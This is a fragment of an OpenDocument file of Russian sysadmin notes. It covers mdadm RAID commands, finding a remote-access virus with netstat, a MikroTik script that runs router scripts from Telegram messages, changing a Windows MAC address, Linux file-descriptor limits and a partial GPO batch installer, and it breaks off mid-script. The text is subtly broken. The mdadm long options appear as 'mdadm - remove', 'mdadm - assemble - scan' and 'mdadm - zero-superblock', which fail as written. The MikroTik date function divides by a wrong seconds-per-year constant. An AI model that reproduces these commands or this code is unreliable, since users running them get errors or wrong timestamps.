      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">* где /dev/md0 - устройство RAID, которое появится после сборки; -l 1 - уровень RAID; -n 2 - количество дисков, из которых собирается массив; /dev/sd{b,c} - сборка выполняется из дисков sdb и sdc.</text:span></text:p>
      <text:p text:style-name="P1">Создание файловой системы и монтирование массива</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/md0 - создание файловой системы ext4 на md0</text:p>
      <text:p text:style-name="P1">mount /dev/md0 /mnt - разово примонтировать md0 к /mnt</text:p>
      <text:p text:style-name="P1">nano /etc/fstab, прописать /dev/md0 /mnt ext4 defaults 1 2 - постоянное монтирование, работает после перезагрузки</text:p>
      <text:p text:style-name="P1">Восстановление RAID</text:p>
      <text:p text:style-name="P1">Замена жесткого диска</text:p>
      <text:p text:style-name="P1">При выходе из строя, команда mdadm -D /dev/md0 выдаст: State : clean, degraded</text:p>
      <text:p text:style-name="P1">mdadm /dev/md0 - remove /dev/sdc - удалить сбойный диск</text:p>
      <text:p text:style-name="P1">mdadm /dev/md0 - add /dev/sde - добавить новый диск в массив</text:p>
      <text:p text:style-name="P1">Статус должен стать Rebuild Status : 40% complete и так до полного восстановления</text:p>
      <text:p text:style-name="P1">Пересборка массива</text:p>
      <text:p text:style-name="P1">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав RAID, вводим:</text:p>
      <text:p text:style-name="P1">mdadm - assemble - scan - команда сама найдет необходимую конфигурацию и восстановит RAID.</text:p>
      <text:p text:style-name="P13">mdadm - assemble /dev/md0 /dev/sdb /dev/sdc - с указанием из каких дисков пересобрать</text:p>
      <text:p text:style-name="P13">Запасной диск (Hot Spare)</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1">mdadm /dev/md0 - add /dev/sdd - Диском Hot Spare станет тот, который просто будет добавлен к массиву</text:p>
      <text:p text:style-name="P1">Добавить диск к массиву, расширить массив</text:p>
      <text:p text:style-name="P1">Добавление активного диска к RAID, который будет использоваться для работы, а не в качестве запасного.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 - add /dev/sde</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm -G /dev/md0 - raid-devices=3 - </text:span><text:span text:style-name="T3">расширяем</text:span><text:span text:style-name="T2"> RAID</text:span></text:p>
      <text:p text:style-name="P1">* в данном примере подразумевается, что у нас RAID 1 и мы добавили к нему 3-й диск.</text:p>
      <text:p text:style-name="P1">Установка mdadm</text:p>
      <text:p text:style-name="P1">Если каким-то образом в дистрибутиве нет этого пакета</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install mdadm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удаление</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">массива</text:span></text:p>
      <text:p text:style-name="P1">Если нам нужно полностью разобрать RAID, сначала размонтируем и остановим его:</text:p>
      <text:p text:style-name="P1">umount /mnt</text:p>
      <text:p text:style-name="P1">* где /mnt - каталог монтирования нашего RAID.</text:p>
      <text:p text:style-name="P1">mdadm -S /dev/md0</text:p>
      <text:p text:style-name="P1">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - zero-superblock /dev/sdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вирус</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">удаленного</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">доступа</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> Windows?</text:span></text:p>
      <text:p text:style-name="P1">Иногда у пользователя ПК могут появиться подозрения, что с его компьютером что-то не так. К примеру: внезапное открытие или закрытие программ, посторонние вкладки, частые взломы аккаунтов и прочее. Одной из причин таких явлений может стать вирус удаленного доступа.</text:p>
      <text:p text:style-name="P1">Чтобы найти вирус:</text:p>
      <text:p text:style-name="P1">1. Запустите командную строку от имени администратора. Удобно открыть через ПКМ на иконку «Пуск».</text:p>
      <text:p text:style-name="P1">2. Перейдите в директорию своего юзера, используя команду «cd C:\Users\&lt;ваш_юзернейм&gt;».</text:p>
      <text:p text:style-name="P1">3. Введите команду «netstat -b». На экран начнут выводиться все подключения ваших программ, а так же их IP-адреса.</text:p>
      <text:p text:style-name="P1">4. Если нашли незнакомый подозрительный процесс, введите команду «netstat -nbo», чтобы узнать PID этого процесса.</text:p>
      <text:p text:style-name="P1">5. Затем выполните команду «taskkill /PID &lt;pid_вашего_процесса&gt; /F», чтобы убить процесс.</text:p>
      <text:p text:style-name="P16">В случае обнаружения вируса вы также увидите IP адрес прокси сервера, через который он имеет доступ к компьютеру. Это может оказаться полезным.</text:p>
      <text:p text:style-name="P16">Удаленный запуск скриптов через Телеграм в Mikrotik</text:p>
      <text:p text:style-name="P1">Представляю переработанную на свой лад версию скрипта, позволяющую удалённо запускать скрипты Mikrotik через Телеграм. Для работы скрипта должны быть заранее известны BotID и ChatID. Скрипт необходимо добавить в System/Sheduler и установить запуск с периодичностью не менее одного раза минуту. Алгоритм работы следующий: каждый раз при активации скрипта запрашивается ПОСЛЕДНЕЕ сообщение в группе с указанным BotID и если разница между временем отправки сообщения в Телеграм и текущим временем на Mikrotik составляет менее 1 минуты, тогда производится запуск скрипта с именем, указанным в теле сообщения. На что нужно обратить внимание:</text:p>
      <text:p text:style-name="P1">1. Работа скрипта привязана к текущему времени, по этой причине на роутере должны быть правильно выставлены время и часовой пояс.</text:p>
      <text:p text:style-name="P1">2. Сообщения для роутера должны начинаться с символа "/". Например, если нужно запустить скрипт с именем "wol", тогда в теле сообщения должно быть написано "/wol", при этом в System/Scripts заранее должен быть прописан скрипт с нужным именем (например: "wol").</text:p>
      <text:p text:style-name="P1">3. Скрипт считывает ПОСЛЕДНЕЕ сообщение в группе и по этой причине не имеет смысла накидывать сразу много команд, в любом случае будет выполнена только последняя.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сам</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">скрипт</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ниже</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># Script remote activation script via Telegram by drPioneer</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># https://forummikrotik.ru/viewtopic.php?p=78085</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tested on ROS 6.48</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># updated 2021/04/05</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:do {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local botID <text:s text:c="3"/>"botXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local myChatID "-XXXXXXXXX";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># Telegram messenger response parsing function by Dimonw</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># https://habr.com/ru/post/482802/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local parse do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local variaMod ("\"".$variable);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local startLoc ([:find $content $variaMod -1] + [:len $variaMod] + 2);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local commaLoc ([:find $content "," $startLoc]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local brakeLoc ([:find $content "}" $startLoc]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local endLoc $commaLoc;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local startSymbol [:pick $content $startLoc]; </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($brakeLoc != 0 and ($commaLoc = 0 or $brakeLoc &lt; $commaLoc)) do={ :set endLoc $brakeLoc; };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($startSymbol = "{") do={ :set endLoc ($brakeLoc + 1); };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($quotas = true) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:set startLoc ($startLoc + 1);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:set endLoc <text:s text:c="2"/>($endLoc - 1);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($endLoc &lt; $startLoc) do={ :set endLoc ($startLoc + 1); };</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local message [:pick $content $startLoc $endLoc];</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:return $message;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># UNIX time conversion function to normal view by Pepelxl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># https://forummikrotik.ru/viewtopic.php?t=11636</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local unixTime do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateY <text:s/>($timeStamp / 31436000 + 1970);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateM (($dateY - 1969) / 4);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateD (($timeStamp / 86400 - $dateM) % 365);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local days <text:s text:c="2"/>[:toarray (31,28,31,30,31,30,31,31,30,31,30,31)];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local months [:toarray ("jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec")];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($dateY % 4 = 0) do={ :set ($days-&gt;1) 29; }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>do {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:for i from=0 to=11 do={ </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:if (($days-&gt;$i) &gt; $dateD) do={ </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:set $dateM ($i); </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:set $dateD ($dateD + 1); </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="20"/>:break;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>} else={ :set $dateD ($dateD - ($days-&gt;$i)); } </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s text:c="12"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>} on-error={}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeS ($timeStamp % 86400);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeH ($timeS / 3600);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local timeM ($timeS % 3600 / 60);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s/>$timeS ($timeS - $timeH * 3600 - $timeM * 60);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local normalTime (($months-&gt;$dateM)."/");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($dateD &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $dateD]."/"); } else={ :set $normalTime ($normalTime.[:tostr $dateD]."/"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set $normalTime ($normalTime.[:tostr $dateY]." "); <text:s text:c="2"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeH &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeH].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeH].":"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeM &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeM].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeM].":"); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if ($timeS &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeS]); } <text:s text:c="4"/>else={ :set $normalTime ($normalTime.[:tostr $timeS]); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ([:totime $normalTime]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:return $normalTime;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/># Main body of the script</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local nameID <text:s text:c="2"/>[ /system identity get name; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local dateNow <text:s/>[ /system clock <text:s text:c="3"/>get date; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local timeNow <text:s/>[ /system clock <text:s text:c="3"/>get time; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local httpResponse [ /tool fetch url="https://api.telegram.org/$botID/getUpdates\?offset=-1&amp;limit=1&amp;allowed_updates=message&amp;timeout=60" as-value output=user; ];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:local content ($httpResponse-&gt;"data");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:if ([:len $content] &gt; 30) do={</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local msgId <text:s text:c="3"/>[$parse content=$content variable="update_id"];</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local message <text:s/>[$parse content=$content variable="text" quotas=true];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s text:c="2"/>message ([:pick $message ([:find $message "/"] + 1) ([:len $message])]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local chat <text:s text:c="4"/>[$parse content=$content variable="chat"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local chatId <text:s text:c="2"/>[$parse content=$chat <text:s text:c="3"/>variable="id"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local userName [$parse content=$content variable="username"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local dateTime [$parse content=$content variable="date"];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:set <text:s text:c="2"/>dateTime ($dateTime + [ /system clock get gmt-offset; ]);</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:local normTime [$unixTime timeStamp=$dateTime];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ("Current time on router:\t $dateNow $timeNow");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:put ("Last message from $userName: time=$normTime, id=$msgId, text=$message.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>:if (($normTime ~ $dateNow) &amp;&amp; ([:totime [:pick $normTime ([:find $normTime " "] + 1) ([:find $normTime " "] + 9)]] &gt; ($timeNow - 00:01:00))) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>:put ("Right time to activation script.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s text:c="12"/>:if (($chatId = $myChatID) &amp;&amp; ([/system script find name=$message] != "")) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:put ("Telegram user $userName activated script '$message'.");</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>:log warning ("Telegram user $userName activated script '$message'."); <text:s text:c="16"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>/system script run $message;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="16"/>/tool fetch keep-result=no url="https://api.telegram.org/$botID/sendmessage\?chat_id=$chatId&amp;text=$nameID: '$message' command accepted.";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="12"/>} else={ :put ("Not all conditions activation script are met."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>} else={ :put ("Bad time to activation script."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">} on-error={ :put ("Script error: 1 - message could have been sent a long time ago. 2 - check whether 'botID' &amp; 'myChatID' variables are specified correctly."); }</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как узнать и при необходимости изменить MAC-адрес в Windows?</text:p>
      <text:p text:style-name="P1">Каждый сетевой адаптер имеет уникальный MAC-адрес (Media Access Control). Он необходим для идентификации отдельных устройств, подключенных к сети. Это относится ко всем типам сетевых карт, включая карты Ethernet и WiFi. </text:p>
      <text:p text:style-name="P1">MAC-адрес (он же физический адрес) представляет собой шестибайтовое число или 12-значное шестнадцатеричное число, которое используется для уникальной идентификации хоста в сети.</text:p>
      <text:p text:style-name="P1">Самый простой способ узнать Mac-адрес - открыть командную строку («Win+R» → «cmd») и выполнить команду «ipconfig /all». Перед вами появится список всех сетевых адаптеров установленных в компьютере, а в поле «Физический адрес» будет указан Mac-адрес.</text:p>
      <text:p text:style-name="P1">Если необходимо изменить этот адрес:</text:p>
      <text:p text:style-name="P1">1. Запустите «Диспетчер устройств» (удобно найти через поиск).</text:p>
      <text:p text:style-name="P1">2. Кликните «Сетевые адаптеры» и выберите нужный для вас, ПКМ по нему → «Свойства».</text:p>
      <text:p text:style-name="P13">3. Перейдите во вкладку «Дополнительно» и выберите свойство «Сетевой адрес».</text:p>
      <text:p text:style-name="P13">4. В поле «Значение» пропишите новый Mac-адрес и примените изменения.</text:p>
      <text:p text:style-name="P4">MAC-адрес состоит из 12 символов - это цифры 0-9 и буквы A-F. Не начинайте первые два символа MAC-адреса с 0, а последним символом в адресе лучше используйте 2, 6, A или E, так как некоторые сетевые карты могут не осуществить подмену.</text:p>
      <text:p text:style-name="P1">Как найти количество открытых файлов в Linux</text:p>
      <text:p text:style-name="P1">Значение сохраняется в</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P1">Проверка Hard лимит в Linux</text:p>
      <text:p text:style-name="P1"># ulimit -Hn</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Проверка Soft лимит в Linux</text:span></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text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Например</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># su root</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Sn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как проверить количество системных дескрипторов файлов в Linux</text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P1">Вы можете увеличить лимит открытых файлов в Linux, отредактировав опцию ядра fs.file-max. Для этого используйте утилиту sysctl.</text:p>
      <text:p text:style-name="P1">Sysctl используется для настройки параметров ядра.</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13"># sysctl -p</text:p>
      <text:p text:style-name="P1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2"><text:soft-page-break/><text:span text:style-name="T3">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</text:span></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tch-</text:span><text:span text:style-name="T3">скрипт</text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="T3">Устаналивает портабельную программу с сетевого диска на локальный диск пользователя и выводит ярлык на рабочий стол. </text:span></text:p>
      <text:p text:style-name="P1">Отредактированный под себя скрипт нужно прикрепить с помощью GPO в домене, как сценарий запуска при старте системы. Логи по установке пишутся на сетевой диск в отдельную папку.</text:p>
      <text:p text:style-name="P1">@echo off</text:p>
      <text:p text:style-name="P1">rem меняем кодировку чтобы использовать кириллицу</text:p>
      <text:p text:style-name="P1">chcp 1251 &gt;nul</text:p>
      <text:p text:style-name="P1">rem указываем директорию с программой для копирования (в нашем случае на сетевом диске М)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set old_dir="M:\Programs\ExampleProgramPortable"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">rem указываем директорию куда копировать программу (в нашем случае в корень диска С)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set new_dir="C:\ExampleProgramPortable"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">rem если директория уже существует пишем запись в лог (дата, время, файл называется именем пользователя), в противном случае копируем программу в директорию new_dir</text:p>
      <text:p text:style-name="P1">rem копируем ярлык программы в общую папку для всех пользователей, чтобы вывести на рабочий стол</text:p>
      <text:p text:style-name="P1">rem переименовываем ярлык кириллицей (если нужно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rem </text:span><text:span text:style-name="T3">делаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запись</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">лог</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">If Exist "%new_dir%\*.*" (</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo %date% %time:~-11,8% DIR exist already &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">) Else (</text:span><text:span text:style-name="T2"/></text:p>
